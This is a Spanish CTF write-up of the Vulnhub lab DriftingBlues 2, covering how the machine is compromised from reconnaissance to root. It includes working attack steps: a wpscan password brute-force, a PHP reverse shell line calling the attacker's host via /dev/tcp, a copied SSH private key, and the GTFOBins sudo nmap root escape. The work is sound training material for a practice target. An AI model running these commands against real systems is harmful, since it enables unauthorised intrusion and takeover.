---
title: DriftingBlues 2 Writeup - Vulnhub
date: 2025-01-23
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

¡Saludos!

Continuamos con la serie **DriftingBlues**!

En este writeup, nos sumergiremos en la máquina [**DriftingBlues2**](https://www.vulnhub.com/entry/driftingblues-2,634/) de **Vulnhub**, la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual debemos realizar una **enumeración web**, encontrando un blog basado en **Wordpress**. Crackearemos el usuario administrador ganando así acceso al panel de administración y luego generarnos una **reverse shell** para ingresar al sistema. Nos conectaremos por **ssh** gracias a la clave privada del usuario que podemos leer y explotamos el binario **nmap** para elevar nuestros privilegios como usuario **root**, obteniendo así las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.30     00:0c:29:81:03:be       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.429 seconds (105.39 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.30
PING 10.11.12.30 (10.11.12.30) 56(84) bytes of data.
64 bytes from 10.11.12.30: icmp_seq=1 ttl=64 time=0.527 ms

--- 10.11.12.30 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.527/0.527/0.527/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.30 -oG ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:05 -03
Nmap scan report for 10.11.12.30
Host is up (0.0016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:81:03:BE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.68 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p21,22,80 -sCV 10.11.12.30 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:08 -03
Nmap scan report for driftingblues.box (10.11.12.30)
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (localhost) [::ffff:10.11.12.30]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/23%Time=6792939D%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,91,"220\x20ProFTPD\x20Server\x20\(localhost\)\x20\[::ffff:1
SF:0\.11\.12\.29\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x
SF:20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n");
MAC Address: 00:0C:29:81:03:BE (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.60 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` se encuentra en funcionamiento un servidor `ProFTPD`.
- Puerto `22` se encuentra en ejecución un servidor `OpenSSH 7.9p1`
- Puerto `80` se identifica un servidor `Apache 2.4.38`.

### FTP - 21

El primer paso es intentar loguearnos al servidor FTP con credenciales `anonymous`. 

```bash
❯ ftp 10.11.12.30
Connected to 10.11.12.30.
220 ProFTPD Server (localhost) [::ffff:10.11.12.30]
Name (10.11.12.30:lv): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
```

Obtenemos acceso, procedemos a realizar un listado el directorio actual y observamos el archivo `secret.jpg`, el cual nos descargamos para ver su contenido.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||40311|)
150 Opening ASCII mode data connection for file list
-rwxr-xr-x   1 ftp      ftp       1403770 Dec 17  2020 secret.jpg
226 Transfer complete
ftp> get secret.jpg
local: secret.jpg remote: secret.jpg
229 Entering Extended Passive Mode (|||43121|)
150 Opening BINARY mode data connection for secret.jpg (1403770 bytes)
  1370 KiB   42.33 MiB/s
226 Transfer complete
1403770 bytes received in 00:00 (37.46 MiB/s)
ftp>
```

![secret](/assets/img/commons/vulnhub/DriftingBlues2/secret.png){: .center-image }

Podemos utilizar diferentes herramientas para analizar datos en la imagen, tales como `exiftool` - `steghide` - `strings`.

Verificando la herramienta `steghide`, podríamos tener un archivo oculto dentro de la imagen.

```bash
❯ steghide info secret.jpg
"secret.jpg":
  format: jpeg
  capacity: 59,6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

Vamos a continuar investigando sobre el resto de servicios, a ver si podemos obtener más información.

### HTTP - 80

Verificamos la web y su código.

![web](/assets/img/commons/vulnhub/DriftingBlues2/web.png){: .center-image }

La web no muestra información sensible, tampoco su código, procedemos a ejecutar un script de nmap `http-enum` para realizar un fuzzing rápido de directorios.

```shell
❯ nmap -p80 --script http-enum 10.11.12.30 -oN webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:56 -03
Nmap scan report for driftingblues.box (10.11.12.30)
Host is up (0.00038s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /blog/: Blog
|_  /blog/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:81:03:BE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds
```
Dicho fuzzing encontró un CMS Wordpress situado en `/blog`. 

Debido a que la web no carga correctamente, observamos en el código que la web busca recursos sobre el dominio http://driftingblues.box/ con lo cual debemos agregar la entrada a nuestro `/etc/hosts`.

![blog_code](/assets/img/commons/vulnhub/DriftingBlues2/blog_code.png){: .center-image }

```shell
echo '10.11.12.30 driftingblues.box' >> /etc/hosts
```

Comprobamos su tecnología con `whatweb`.

```shell
❯ whatweb http://driftingblues.box/
http://driftingblues.box [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.11.12.30]
```


Comprobamos con `whatweb` /blog/.

```shell
❯ whatweb http://driftingblues.box/blog/
http://driftingblues.box/blog/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.11.12.30], MetaGenerator[WordPress 5.6], PoweredBy[--], Script, Title[drifting blues tech blog], UncommonHeaders[link], WordPress[5.6]
```

Estamos frente a **WordPress 5.6**. 

De igual manera, lanzamos `gobuster` para obtener más respuestas de directorios o archivos ocultos, tanto en la **raíz** como en **/blog/**, pero no obtuvimos urls ni archivos sensibles, pero notamos que la web tiene expuesto el archivo **xmlrpc.php** al cual podemos realizarles consultas por POST para listar métodos disponibles.

Al ser Wordpress, podemos usar la herramienta `wpscan`, para encontrar vulnerabilidades y además hacer fuerza bruta sobre los usuarios encontrados.

```bash
wpscan --url http://driftingblues.box/blog -e u,vp,vt,dbe --api-token=$WPSCAN_KEY --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://driftingblues.box/blog/ [10.11.12.30]
[+] Started: Thu Jan 23 21:26:28 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://driftingblues.box/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://driftingblues.box/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://driftingblues.box/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://driftingblues.box/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://driftingblues.box/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |  - http://driftingblues.box/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |
 | [!] 44 vulnerabilities identified:

[i] User(s) Identified:

[+] albert
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://driftingblues.box/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

Procedemos a realizar fuerza bruta sobre el usuario `albert` utilizando el diccionario `rockyou`.

```bash
wpscan --url http://driftingblues.box/blog -U albert -P /usr/share/wordlists/rockyou.txt -t 10
_______________________________________________________________

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - albert / scotland1
Trying albert / wellington Time: 00:01:33 <                      > (6670 / 14351062)  0.04%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: albert, Password: scotland1

```

Encontramos el password del usuario, ahora podemos loguearnos en el panel de administración.

![wp-admin](/assets/img/commons/vulnhub/DriftingBlues2/wp-admin.png){: .center-image }

## Explotación

---

Una vez que tenemos acceso al panel de administración de Wordpress, el objetivo ahora será poder enviarnos una reverse shell para ingresar al sistema.

Lo que hago en este punto es modificar el archivo de error 404 del tema, cargando la reverse shell.

```bash
system("bash -c 'bash -i >& /dev/tcp/10.11.12.10/443 0>&1'");
```

![404](/assets/img/commons/vulnhub/DriftingBlues2/404.png){: .center-image }

Nos ponemos en escucha de nuestro lado para recibir la reverse shell.

```bash
❯ rlwrap nc -nlvp 443
```

Apúntamos la url a un destino que no exista y obtenemos la reverse shell.

![post_non_exist](/assets/img/commons/vulnhub/DriftingBlues2/post_non_exist.png){: .center-image }

![reverse_shell](/assets/img/commons/vulnhub/DriftingBlues2/reverse_shell.png){: .center-image }

## Pivoting de usuario

---

Al ingresar al sistema, nuestro objetivo es encontrar las flags, nos dirigimos al path `/home/` e ingresamos a la carpeta del usuario freedie, pero no podemos listar la flag por falta de permisos.

Procedemos a analizar el contenido de la carperta y notamos que en el directorio `.ssh` la clave privada del usuario es accesible, la cual nos sirve para conectarnos por *SSH* sin necesidad de conocer la contraseña del usuario.

Copiamos el contenido de la clave a nuestro equipo, le damos permiso 400 y nos conectamos por ssh.

```shell
www-data@driftingblues:/home/freddie/.ssh$ cat id_
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAv/HVquua1jRNOCeHvQbB1CPsqkc6Y2N25ZpJ84H7DonP9CGo+vO/
gwHV7q4TsCfCK67x8uYoAOydIlIU6gwF17CpXydK52FxFfteLc0h9rkUKs8nIFxbxXBv8D
IiUwhtVTEy7ZcEYEBeC40LPhBB3/70NiTRHFXP0kOWCXLUZYrSwzpq+U+45JkzkrXYZUkL
hbHOoNFzVZTUESY/sO6/MZAGGCI2SytaIerWUiDCJB5vUB7cKuV6YwmSJw9rKKCSKWnfm+
bwAXZwL9iv+yTt5OiaY/81tzBC6WbbmIbdhibjQQS6AXRxwRdv7UrA5ymfktynDl4yOwX3
zO1cz4xK+wAAA8hn0zMfZ9MzHwAAAAdzc2gtcnNhAAABAQC/8dWq65rWNE04J4e9BsHUI+
yqRzpjY3blmknzgfsOic/0Iaj687+DAdXurhOwJ8IrrvHy5igA7J0iUhTqDAXXsKlfJ0rn
YXEV+14tzSH2uRQqzycgXFvFcG/wMiJTCG1VMTLtlwRgQF4LjQs+EEHf/vQ2JNEcVc/SQ5
YJctRlitLDOmr5T7jkmTOStdhlSQuFsc6g0XNVlNQRJj+w7r8xkAYYIjZLK1oh6tZSIMIk
Hm9QHtwq5XpjCZInD2sooJIpad+b5vABdnAv2K/7JO3k6Jpj/zW3MELpZtuYht2GJuNBBL
oBdHHBF2/tSsDnKZ+S3KcOXjI7BffM7VzPjEr7AAAAAwEAAQAAAQAWggBBM7GLbsSjUhdb
tiAihTfqW8HgB7jYgbgsQtCyyrxE73GGQ/DwJtX0UBtk67ScNL6Qcia8vQJMFP342AITYd
bqnovtCAMfxcMsccKK0PcpcfMvm0TzqRSnQOm/fNx9QfCr5aqQstuUVSy9UWC4KIhwlO6k
ePeOu3grkXiQk3uz+6H3MdXnfqgEp0bFr7cPfLgFlZuoUAiHlHoOpztP19DflVwJjJSLBT
8N+ccZIuo4z8GQK3I9kHBv7Tc1AIJLDXipHfYwYe+/2x1Xpxj7oPP6gXkmxqwQh8UQ8QBY
dT0J98HWEZctSl+MY9ybplnqeLdmfUPMlWAgOs2/dxlJAAAAgQCwZxd/EZuDde0bpgmmQ7
t5SCrDMpEb9phG8bSI9jiZNkbsgXAyj+kWRDiMvyXRjO+0Ojt97/xjmqvU07LX7wS0sTMs
QyyqBik+bFk9n2yLnJHtAsHxiEoNZx/+3s610i7KsFZQUT2FQjo0QOEoobALsviwjFXI1E
OsTmk2HN82rQAAAIEA7r1pXwyT0/zPQxxGt9YryNFl2s54xeerqKzRgIq2R+jlu4dxbVH1
FMBrPGF9razLqXlHDaRtl8Bk04SNmEfxyF+qQ9JFpY8ayQ1+G5kK0TeFvRpxYXrQH6HTMz
50wlwX9WqGWQMNzmAq0f/LMYovPaBfwK5N90lsm9zhnMLiTFcAAACBAM3SVsLgyB3B5RI6
9oZcVMQlh8NgXcQeAaioFjMRynjY1XB15nZ2rSg/GDMQ9HU0u6A9T3Me3mel/EEatQTwFQ
uPU+NjV7H3xFjTT1BNTQY7/te1gIQL4TFDhK5KeodP2PsfUdkFe2qemWBgLTa0MHY9awQM
j+//Yl8MfxNraE/9AAAADmZyZWRkaWVAdm1ob3N0AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```bash
❯ nano id_rsa

❯ chmod 400 id_rsa

❯ ssh -i id_rsa freddie@10.11.12.30
The authenticity of host '10.11.12.30 (10.11.12.30)' can't be established.
ED25519 key fingerprint is SHA256:P07e9iTTwbyQae7lGtYu8i4toAyBfYkXY9/kw/dyv/4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.12.30' (ED25519) to the list of known hosts.
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable l
```


## Escalación de privilegios

---

Validamos los permisos del usuario freedie sobre el sistema.

```bash
freddie@driftingblues:~$ sudo -l
Matching Defaults entries for freddie on driftingblues:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User freddie may run the following commands on driftingblues:
    (root) NOPASSWD: /usr/bin/nmap
```

Podemos ejecutar como root el binario `nmap`, el cual vamos a utilizar para elevar nuestro privilegio.

Utilizamos la web [GTFOBins](https://gtfobins.github.io/).

![gtfobins](/assets/img/commons/vulnhub/DriftingBlues2/gtfobins.png){: .center-image }

Ejecutamos los comandos que menciona la web y elevamos nuestro privilegio, obteniendo así ambas flags.

```bash
freddie@driftingblues:~$ TF=$(mktemp)
freddie@driftingblues:~$ echo 'os.execute("/bin/sh")' > $TF
freddie@driftingblues:~$ sudo nmap --script=$TF
Starting Nmap 7.70 ( https://nmap.org ) at 2025-01-23 18:06 CST
NSE: Warning: Loading '/tmp/tmp.4vsOOCkNxI' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
# # user.txt
# flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

# # /root
# root.txt
# flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```
Hope it helps!